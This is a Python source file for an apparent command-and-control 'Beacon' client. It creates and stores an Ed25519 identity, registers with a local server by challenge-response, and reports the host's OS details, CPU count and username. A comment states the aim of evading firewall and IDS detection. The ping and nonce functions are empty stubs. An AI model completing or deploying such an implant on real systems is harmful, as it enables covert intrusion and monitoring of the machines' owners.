import uuid
import os
import urllib3
import base64
import json

# Encryption libraries to prevent Firewall and IDS Detection
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey


class Beacon:

    BASE_SERVER_URL = "http://127.0.0.1:4999"

    def __init__(self):
        self.description = "Hello, I am a Beacon."

        if self.identity_exists():
            identity = self.load_beacon_identity()

            self.beacon_id = identity["beacon_id"]
            self.private_key_hex = identity["private_key"]

            self.private_key = Ed25519PrivateKey.from_private_bytes(
                bytes.fromhex(self.private_key_hex)
            )

            self.public_key = self.private_key.public_key()
            self.public_key_hex = self.public_key.public_bytes_raw().hex()

            result = self.verify_beacon_registration()

            if result == "NOT_FOUND":
                self.beacon_fingerprint = self.generate_beacon_fingerprint()
                self.register_beacon()

        else:
            self.beacon_id = str(uuid.uuid4())

            self.generate_key_pairs()
            self.beacon_fingerprint = self.generate_beacon_fingerprint()
            self.register_beacon()

    def identity_exists(self):
        return os.path.exists("beacon_identity.json")

    def store_beacon_identity(self):
        try:
            with open("beacon_identity.json", "w") as f:
                state = {
                    "beacon_id": self.beacon_id,
                    "private_key": self.private_key_hex,
                }
                json.dump(state, f, indent=4)
                return True
        except PermissionError:
            return False

    def load_beacon_identity(self):
        try:
            with open("beacon_identity.json", "r") as f:
                return json.load(f)

        except FileNotFoundError:
            return {"error": "File does not exist."}

        except PermissionError:
            return {"error": "Not enough permissions."}

    def verify_beacon_registration(self):
        identity = self.load_beacon_identity()

        req = urllib3.request(
            "POST",
            f"{self.BASE_SERVER_URL}/api/register/verify",
            json={"beacon_id": identity["beacon_id"]},
        )

        if req.status == 404:
            return "NOT_FOUND"

        if req.status != 200:
            print("Beacon verification request failed.")
            return False

        json_response = req.json()

        challenge_id = json_response["challenge_id"]
        challenge = json_response["challenge"]

        challenge_signature = base64.b64encode(
            self.private_key.sign(base64.b64decode(challenge))
        ).decode("utf-8")

        challenge_response = {
            "challenge_id": challenge_id,
            "challenge_signature": challenge_signature,
        }

        req = urllib3.request(
            "POST",
            f"{self.BASE_SERVER_URL}/api/register/verify-challenge-response",
            json=challenge_response,
        )

        if req.status == 200 and req.json()["verified"]:
            print("Beacon authentication successful.")
            return True

        print("Beacon authentication failed:", req.data)
        return False

    def generate_beacon_fingerprint(self):
        os_info = os.uname()
        os_cpu_count = os.cpu_count()
        os_user = os.environ.get("USER") or os.environ.get("USERNAME")

        return {
            "beacon_id": self.beacon_id,
            "public_key": self.public_key_hex,
            "os_info": os_info,
            "os_cpu_count": os_cpu_count,
            "os_user": os_user,
        }

    def generate_key_pairs(self):
        self.private_key = Ed25519PrivateKey.generate()
        self.public_key = self.private_key.public_key()

        self.private_key_hex = self.private_key.private_bytes_raw().hex()
        self.public_key_hex = self.public_key.public_bytes_raw().hex()

    def register_beacon(self):
        initial_registration_request = urllib3.request(
            "POST",
            f"{self.BASE_SERVER_URL}/api/register/start",
            json=self.beacon_fingerprint,
        )

        if initial_registration_request.status != 200:
            print(initial_registration_request.data)
            return False

        json_response = initial_registration_request.json()

        challenge_id = json_response["challenge_id"]
        challenge = json_response["challenge"]

        challenge_signature = base64.b64encode(
            self.private_key.sign(base64.b64decode(challenge))
        ).decode("utf-8")

        challenge_response = {
            "challenge_id": challenge_id,
            "challenge_signature": challenge_signature,
        }

        req = urllib3.request(
            "POST",
            f"{self.BASE_SERVER_URL}/api/register/verify-challenge-response",
            json=challenge_response,
        )

        if req.status == 200 and req.json()["verified"]:
            print("Beacon registered successfully.")
            self.store_beacon_identity()
            return True

        if req.status == 409:
            print("Beacon already registered.")
            return False

        print("Beacon registration failed:", req.data)
        return False

    def generate_signed_nonce(self):
        pass
    
    def send_ping(self):
        pass
        

b1 = Beacon()
